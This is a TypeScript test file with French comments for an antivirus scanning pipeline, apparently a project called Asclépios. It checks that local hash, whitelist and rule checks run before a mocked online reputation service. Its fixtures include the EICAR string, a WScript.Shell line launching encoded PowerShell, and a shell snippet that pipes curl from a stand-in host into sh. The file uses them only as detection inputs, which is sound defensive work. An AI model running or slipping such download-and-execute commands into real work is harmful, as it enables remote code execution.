// La chaîne d'analyse d'un fichier d'Asclépios, dans l'ordre conseillé :
//   empreinte locale → liste blanche locale (NSRL/CIRCL) → scanBuffer (empreinte + YARA/Grimoire +
//   heuristiques) → réputation en ligne (MalwareBazaar puis VirusTotal).
// On vérifie l'ORDRE et le COURT-CIRCUIT « connu-sain » : un fichier dont l'empreinte est dans la liste
// blanche ne déclenche AUCUNE demande en ligne. Rien ici ne touche Internet : la réputation « en ligne »
// est un faux service local qui compte ses appels, et l'empreinte EICAR est déclarée par une fausse base.
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { BASE_RULES, compileGaldr, flat, RuleSet, scanBuffer, sha256, type Knowledge } from '../src/valhalla/ullr/engine.ts';
import { Blanche } from '../src/valhalla/ullr/nsrl.ts';

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const CHEVAL = 'var s = new ActiveXObject("WScript.Shell"); s.Run("cmd /c powershell -enc AAAA");';  // script Windows malveillant (règle sûre)
const SOUPCON = '#!/bin/sh\ncurl http://x/a | sh\nchmod +x /tmp/a\n';                                 // indice d'heuristique, rien de sûr

/** Faux service de réputation en ligne : compte ses appels (MalwareBazaar puis VirusTotal). */
function fauxEnLigne() {
  const connus = new Set([sha256(EICAR)]);   // au cas où un soupçon arrive jusqu'ici
  const c = { appels: 0 };
  return { compteur: c, enLigne: (sha: string) => { c.appels++; return { source: 'MalwareBazaar', malveillant: connus.has(sha) }; } };
}
/** La chaîne, dans l'ordre. `K.hash` est la base d'empreintes LOCALE (ici, un faux service qui connaît EICAR). */
function chaine(name: string, body: string, K: Knowledge, blanche: Blanche, enLigne: (sha: string) => { source: string; malveillant: boolean }) {
  const etapes: string[] = [];
  const v = scanBuffer(name, Buffer.from(body), K, { where: '/home/awa/Téléchargements' });
  etapes.push('analyse locale');                 // empreinte locale + YARA/Grimoire + heuristiques
  etapes.push('liste blanche locale');
  if (blanche.contient(v.sha256)) return { verdict: 'sain', par: 'liste blanche locale', etapes, enLigne: 0 };
  const sur = flat(v).find((f) => f.sure);                 // empreinte locale ou règle sûre : décisif, sans aller en ligne
  if (sur) return { verdict: 'malveillant', par: sur.by, etapes, enLigne: 0 };
  if (flat(v).length) { etapes.push('réputation en ligne'); const r = enLigne(v.sha256); return { verdict: r.malveillant ? 'malveillant' : 'à vérifier', par: `réputation ${r.source}`, etapes, enLigne: 1 }; }
  return { verdict: 'rien', par: 'local', etapes, enLigne: 0 };
}

const baseLocale = (): Knowledge => ({ rules: new RuleSet(BASE_RULES.map(compileGaldr)), hash: (h) => (h === sha256(EICAR) ? { family: 'EICAR-Test', source: 'faux service local' } : undefined) });

test('Chaîne · EICAR connu par l\'empreinte locale : verdict sûr, aucune demande en ligne', () => {
  const dir = mkdtempSync(join(tmpdir(), 'chaine-'));
  try {
    const K = baseLocale(), b = new Blanche(dir), { compteur, enLigne } = fauxEnLigne();
    const r = chaine('eicar.com', EICAR, K, b, enLigne);
    assert.equal(r.verdict, 'malveillant');
    assert.equal(r.par, 'empreinte');
    assert.equal(compteur.appels, 0, 'une empreinte locale suffit : on n\'interroge pas les services en ligne');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('Chaîne · un script malveillant (règle sûre) : décidé en local, sans demande en ligne', () => {
  const dir = mkdtempSync(join(tmpdir(), 'chaine-'));
  try {
    const K = baseLocale(), b = new Blanche(dir), { compteur, enLigne } = fauxEnLigne();
    const r = chaine('facture.js', CHEVAL, K, b, enLigne);
    assert.equal(r.verdict, 'malveillant');
    assert.equal(r.par, 'règle');
    assert.equal(compteur.appels, 0);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('Chaîne · un soupçon non sûr monte jusqu\'à la réputation en ligne', () => {
  const dir = mkdtempSync(join(tmpdir(), 'chaine-'));
  try {
    const K = baseLocale(), b = new Blanche(dir), { compteur, enLigne } = fauxEnLigne();
    const r = chaine('a.sh', SOUPCON, K, b, enLigne);
    assert.equal(compteur.appels, 1, 'rien de sûr en local : on demande la réputation en ligne');
    assert.ok(r.etapes.indexOf('liste blanche locale') < r.etapes.indexOf('réputation en ligne'), 'la liste blanche passe AVANT la réputation en ligne');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('Chaîne · court-circuit : un fichier connu-sain (liste blanche) ne va jamais en ligne', () => {
  const dir = mkdtempSync(join(tmpdir(), 'chaine-'));
  try {
    const K = baseLocale(), b = new Blanche(dir), { compteur, enLigne } = fauxEnLigne();
    // Le même fichier « soupçon » : sans liste blanche il irait en ligne ; on déclare son empreinte connue-saine.
    b.remplacer([sha256(SOUPCON)], 'NSRL');
    const r = chaine('a.sh', SOUPCON, K, b, enLigne);
    assert.equal(r.verdict, 'sain');
    assert.equal(r.par, 'liste blanche locale');
    assert.equal(compteur.appels, 0, 'connu-sain : aucune demande en ligne');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
